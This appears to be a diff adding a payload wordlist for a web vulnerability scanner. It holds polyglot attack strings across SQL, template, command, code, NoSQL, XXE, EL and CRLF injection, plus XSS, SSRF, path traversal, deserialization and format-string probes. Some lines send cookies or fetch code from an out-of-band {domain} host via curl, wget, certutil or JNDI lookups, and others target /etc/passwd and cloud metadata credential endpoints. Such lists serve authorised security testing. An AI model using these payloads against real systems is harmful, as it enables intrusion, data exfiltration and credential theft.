@@ -1,0 +1,247 @@
+##POLYGLOT - SQLi Cross-Dialect (Timing)##
+SLEEP(5)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+1;WAITFOR DELAY '0:0:5'--/*'OR SLEEP(5) OR'1'='1*/"OR pg_sleep(5)--
+1)OR(SLEEP(5))OR('/**/')OR(BENCHMARK(5000000,SHA1('a')))OR("/**/")OR(pg_sleep(5))--
+'AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))OR'1'='1/*"AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--*/
+'))OR SLEEP(5) OR(('/*'))OR pg_sleep(5)--*/')OR LIKE('A',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+##POLYGLOT - SQLi Cross-Dialect (Error)##
+'AND 1=CONVERT(int,@@version)--/*'OR 1=extractvalue(1,concat(0x7e,version()))--*/"OR CAST(version() AS int)--
+1'OR updatexml(1,concat(0x7e,(SELECT version())),1)OR'"OR 1=CONVERT(int,(SELECT @@version))OR"--
+')OR(1=CAST(version() AS int))OR('/**/OR extractvalue(1,concat(0x7e,version()))OR")--
+##POLYGLOT - SQLi Cross-Dialect (Math: 1337)##
+'UNION SELECT 7*191--/*'UNION SELECT 7*191,7*191--*/"UNION SELECT 7*191,7*191,7*191--
+')UNION SELECT 7*191,NULL,NULL,NULL--/*')UNION SELECT 7*191,NULL--*/")UNION SELECT 7*191--
+*/UNION SELECT 7*191--/*'UNION ALL SELECT 7*191--*/"UNION SELECT 7*191--
+##POLYGLOT - SQLi Cross-Dialect (OOB)##
+';EXEC master..xp_dirtree '\\{domain}\a'--/*'OR LOAD_FILE('\\\\{domain}\\a')OR'*/"OR(SELECT dblink_send_query('host={domain}','SELECT 1'))--
+1;COPY(SELECT '')TO PROGRAM 'nslookup {domain}'--/*'UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))--*/"--
+';DECLARE @q VARCHAR(1024);SET @q='\\'+@@version+'.{domain}\a';EXEC master..xp_dirtree @q--
+##POLYGLOT - SSTI Cross-Engine (Math: 1337)##
+{{7*191}}${7*191}<%= 7*191 %>${{7*191}}#{7*191}#set($x=7*191)$x[=7*191]@(7*191)[[${7*191}]]
+{{7*'191'}}${7*191}#{7*191}<%= 7*191 %>${{7*191}}{% set x=7*191 %}{{x}}[#assign x=7*191]${x}
+{{7*191}}${7*191}{{=7*191}}<%=7*191%>#{7*191}${{7*191}}${T(java.lang.Math).abs(1337)}
+##POLYGLOT - SSTI Cross-Engine (Timing)##
+{{__import__('time').sleep(5)}}${T(java.lang.Thread).sleep(5000)}<%= sleep(5) %>${{T(java.lang.Thread).sleep(5000)}}#{sleep(5)}
+{% set x=__import__('time').sleep(5) %}#{sleep(5)}${{T(java.lang.Thread).sleep(5000)}}[[${T(java.lang.Thread).sleep(5000)}]]
+##POLYGLOT - SSTI Cross-Engine (OOB)##
+{{__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}${T(java.net.URL).new('http://{domain}/ssti').openStream()}<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>${{T(java.net.URL).new('http://{domain}/ssti').openStream()}}
+{% set x=__import__('urllib.request').request.urlopen('http://{domain}/ssti') %}#{require('net/http');Net::HTTP.get(URI('http://{domain}/ssti'))}${{T(java.net.URL).new('http://{domain}/ssti').openStream()}}
+##POLYGLOT - SSTI Cross-Engine (Error)##
+${{<%[%'"}}%\
+{{.}}${.}<%= nil.x %>#{.}${{.}}{% invalid %}[#invalid/]@{invalid}
+##POLYGLOT - XSS Cross-Context##
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1337) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1337)//>\x3e
+'"><img src=x onerror=alert(1337)><!--
+'"/><svg/onload=alert(1337)//><script>alert(1337)</script><!--
+--></script>"><img/src=x onerror=alert(1337)><svg/onload=alert(1337)>{{1337}}${1337}<%= 1337 %>
+javascript:alert(1337)//";alert(1337)//';alert(1337)//`alert(1337)`//--></script><img src=x onerror=alert(1337)>
+##POLYGLOT - XSS Blind/OOB##
+'"><script src=//{domain}/x.js></script><img src=//{domain}/x onerror=alert(1337)><!--
+'"><img src=x onerror="fetch('//{domain}/'+document.cookie);alert(1337)"><svg/onload=fetch('//{domain}/')><!--
+--></script>'"><img src=x onerror="new Image().src='//{domain}/?c='+document.cookie;alert(1337)"><!--
+##POLYGLOT - OS Command Injection Cross-Shell (Timing)##
+;sleep 5 #'|sleep 5|"$(sleep 5)`sleep 5`
+&timeout /T 5&;sleep 5;'|sleep 5 #"|timeout 5|`sleep 5`
+||sleep 5&&sleep 5;sleep 5|sleep 5\n$(sleep 5)\n`sleep 5`
+##POLYGLOT - OS Command Injection Cross-Shell (OOB)##
+;nslookup {domain} #'|nslookup {domain}|"$(nslookup {domain})`nslookup {domain}`
+&ping -c1 {domain}&;curl {domain};'|curl {domain} #"|wget {domain}|`nslookup {domain}`
+||nslookup {domain}||&certutil -urlcache -f http://{domain}/x x&;wget -q http://{domain};
+##POLYGLOT - OS Command Injection Cross-Shell (Math: 1337)##
+;echo $((7*191)) #'|expr 7 \* 191|"$(echo $((7*191)))`expr 7 \* 191`
+&set /a 7*191&;echo $((7*191));'|python3 -c "print(7*191)"|`echo $((7*191))`
+##POLYGLOT - Code Injection Cross-Language (Math: 1337)##
+7*191
+eval('7*191')
+(7*191)
+int(1337.0)
+abs(-1337)
+##POLYGLOT - Code Injection Cross-Language (Timing)##
+__import__('time').sleep(5)
+sleep(5)
+require('child_process').execSync('sleep 5')
+java.lang.Thread.sleep(5000)
+select(undef,undef,undef,5)
+##POLYGLOT - Code Injection Cross-Language (OOB)##
+__import__('urllib.request').request.urlopen('http://{domain}/pyeval')
+require('http').get('http://{domain}/nodeeval')
+file_get_contents('http://{domain}/phpeval')
+require 'net/http';Net::HTTP.get(URI('http://{domain}/rbeval'))
+use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>'{domain}',PeerPort=>9999)
+new java.net.URL('http://{domain}/javaeval').openStream()
+##POLYGLOT - NoSQL Injection##
+{"$gt":"","$ne":""}
+[$ne]=1&[$gt]=&[$regex]=.*
+{"$where":"sleep(5)||this.a==1"}
+';return true;var x='\\';return this.a=='
+{"$or":[{"a":{"$gt":""}},{"a":{"$regex":".*"}}],"$comment":"'\""}
+##POLYGLOT - XXE##
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://{domain}/evil.dtd">%dtd;%payload;]><foo>&exfil;</foo>
+<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "1337">]><foo>&a;</foo>
+##POLYGLOT - SSRF##
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://[::ffff:127.0.0.1]/
+http://0x7f000001/
+http://0177.0.0.1/
+http://127.1/
+http://{domain}/ssrf
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+dict://127.0.0.1:6379/INFO
+file:///etc/passwd
+##POLYGLOT - Path Traversal##
+../../../../../../../etc/passwd
+..\..\..\..\..\..\..\windows\win.ini
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+....//....//....//....//....//etc/passwd
+..%00/..%00/..%00/..%00/etc/passwd%00.jpg
+/%5C../%5C../%5C../%5C../%5C../etc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+##POLYGLOT - Deserialization##
+${jndi:ldap://{domain}/a}
+${jndi:rmi://{domain}/a}
+${jndi:dns://{domain}/a}
+O:8:"stdClass":1:{s:4:"evil";s:19:"system('id');die();";}
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nslookup {domain}')}()"}
+##POLYGLOT - Prototype Pollution##
+__proto__[polluted]=1337
+constructor[prototype][polluted]=1337
+{"__proto__":{"polluted":1337}}
+{"constructor":{"prototype":{"polluted":1337}}}
+__proto__.polluted=1337&constructor.prototype.polluted=1337
+##POLYGLOT - EL Injection Cross-Engine##
+${7*191}#{7*191}%{7*191}@{7*191}${{7*191}}
+${T(java.lang.Runtime).getRuntime().exec('nslookup {domain}')}#{T(java.lang.Runtime).getRuntime().exec('nslookup {domain}')}
+${applicationScope}#{facesContext.externalContext.requestHeaderMap}%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']}
+##POLYGLOT - Header/CRLF Injection##
+%0d%0aX-Injected:1337%0d%0a
+%0d%0aSet-Cookie:x=1337%0d%0a%0d%0a<script>alert(1337)</script>
+\r\nX-Injected:1337\r\nHost:evil.com
+##POLYGLOT - Format String (C/C++/ObjC)##
+%s%s%s%s%s%s%s%s%s%s
+%x%x%x%x%x%x%x%x%x%x
+%p%p%p%p%p%p%p%p%p%p
+%n%n%n%n%n%n%n%n%n%n
+AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+%d%d%d%d%d%d%d%d%d%d
+%s(un='%s')=%u
+%.1337x
+%1337d
+%1337$x
+%1337$n
+%1337$s
+%*.*s
+%@%@%@%@
+##POLYGLOT - Python Format String Injection##
+{0.__class__.__mro__[1].__subclasses__()}
+{0.__class__}
+{0.__init__.__globals__}
+{0.__class__.__init__.__globals__[os].popen(id).read()}
+##POLYGLOT - .NET Format String Injection##
+{0}
+{0:X}
+{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}
+{0:R}
+##POLYGLOT - Buffer Overflow - Error##
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n%n%n%n%n%n%n%n
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+##POLYGLOT - Integer Boundary - Error##
+' AND 1=CAST(2147483648 AS int)--
+' AND 1=CAST(9999999999999999999 AS int)--
+' AND 1=CAST(1e309 AS int)--
+' OR 1/0--
+' AND 1=CAST(-2147483649 AS int)--
+eval("Number.MAX_SAFE_INTEGER+1")
+eval("parseInt('9'.repeat(999))")
+##POLYGLOT - Integer Boundary - Reflected##
+0
+-1
+1
+2147483647
+2147483648
+-2147483648
+-2147483649
+4294967295
+4294967296
+9999999999999999999
+-9999999999999999999
+0x7FFFFFFF
+0x80000000
+0xFFFFFFFF
+0x100000000
+32767
+32768
+-32768
+-32769
+65535
+65536
+127
+128
+-128
+-129
+255
+256
+1e308
+1e309
+-1e308
+-1e309
+NaN
+Infinity
+-Infinity
+1.7976931348623157e+308
+5e-324
+-0
+##POLYGLOT - Type Confusion - Error##
+' AND 1=undefined--
+eval("undefined.property")
+eval("null.toString()")
+eval("({}).nonexistent()")
+eval("[][0]()")
+eval("[null][0].toString()")
+##POLYGLOT - Type Confusion - Reflected##
+undefined
+undef
+null
+NULL
+(null)
+nil
+NIL
+None
+true
+false
+True
+False
+TRUE
+FALSE
+NaN
+Infinity
+0
+0.0
+-0
+-0.0
+""
+''
+[]
+{}
+[null]
+{"":""}
+##POLYGLOT - Null Byte - Error##
+test%00'OR'1'='1
+%00<script>alert(1337)</script>
+../../../etc/passwd%00.jpg
+test\0' AND 1=CAST(1 AS int)--
+##POLYGLOT - Null Byte - Reflected##
+%00
+\0
+\x00
+\u0000
+%00%00%00%00
+test%00admin
+test\0admin
